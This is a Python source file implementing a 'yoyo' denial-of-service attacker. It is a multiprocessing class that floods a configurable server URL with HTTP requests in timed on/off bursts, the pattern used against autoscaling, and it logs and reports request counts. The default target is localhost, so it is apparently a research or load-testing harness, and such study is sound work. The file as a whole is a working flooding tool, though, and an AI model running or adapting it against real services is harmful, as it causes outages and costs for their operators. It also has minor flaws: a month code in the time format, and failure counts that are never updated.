import requests
import multiprocessing as mp
import time
from collections import OrderedDict
from .reporter import Reporter
from datetime import datetime


class AttackerSync(mp.Process):

    def __init__(self, config, start_attack_event, kill_event):
        super().__init__()
        self._threads = config.get("threads", 10)
        self._time_on = config.get("time_on", 10)
        self._time_off = config.get("time_off", 10)
        self._wait_between_requests = config.get("wait_between_requests", 0)
        self.logger = config.get("logger")
        self._report_queue = config.get("report_queue")
        self._start_attack_event = start_attack_event
        self._kill_event = kill_event
        self._request_config = config.get("request", {})
        self._server_dst = self._request_config.get("server_url", "http://localhost:8080")
        self._request_method = self._request_config.get("method", "get")
        self._request_headers = self._request_config.get("headers", {})
        self._request_data = self._request_config.get("data", {})
        self._loop = None
        self._sent_per_session = OrderedDict()
        self._failed_sent_per_session = OrderedDict()
        self._current_session_time = None
        self._kill = False

    @property
    def kill(self):
        return self._kill_event.is_set()

    @property
    def total_requests(self):
        return sum(self._sent_per_session.values())

    @property
    def total_fail_requests(self):
        return sum(self._failed_sent_per_session.values())

    def send_report(self, total_requests, total_fail_requests, num_sessions):
        report = Reporter(self.name, total_requests, total_fail_requests, num_sessions)
        self._report_queue.put(report)

    def send_requests(self, max_time):
        st_time = time.time()
        end_time = st_time + max_time
        statuses = []
        while time.time() < end_time and not self.kill:
            req = requests.request(self._request_method, self._server_dst, headers=self._request_headers,
                                   json=self._request_data)
            self.logger.debug(req.status_code)
            statuses.append(req.status_code)
            self._sent_per_session[self._current_session_time] += 1
            time.sleep(self._wait_between_requests)

    def attack_on(self):
        self._current_session_time = datetime.now().strftime('%H:%m:%S')
        self._sent_per_session[self._current_session_time] = 0
        self._failed_sent_per_session[self._current_session_time] = 0
        self.logger.debug(f"start time: {datetime.now().strftime('%H:%m:%S')}")
        self.send_requests(self._time_on)

    def attack_off(self):
        st_time = time.time()
        end_time = st_time + self._time_off
        while time.time() < end_time and not self.kill:
            # So kill could be relatively quick
            time.sleep(0.1)

    def attack_session(self):
        self.attack_on()
        self.attack_off()
        self.logger.info(f"Total requests in session: {self._sent_per_session[self._current_session_time]}")
        return self._sent_per_session[self._current_session_time]

    def yoyo_attack(self):
        self.logger.info("Starting yoyo attack..")
        num_sessions = 0
        self._start_attack_event.wait()  # wait for all processes to start
        while not self.kill:
            self.attack_session()
            num_sessions += 1
        self.logger.info("ending yoyo attack..")
        self.logger.debug(f"Total requests {self.total_requests}")
        self.send_report(self.total_requests, self.total_fail_requests, num_sessions)

    def run(self) -> None:
        self.yoyo_attack()


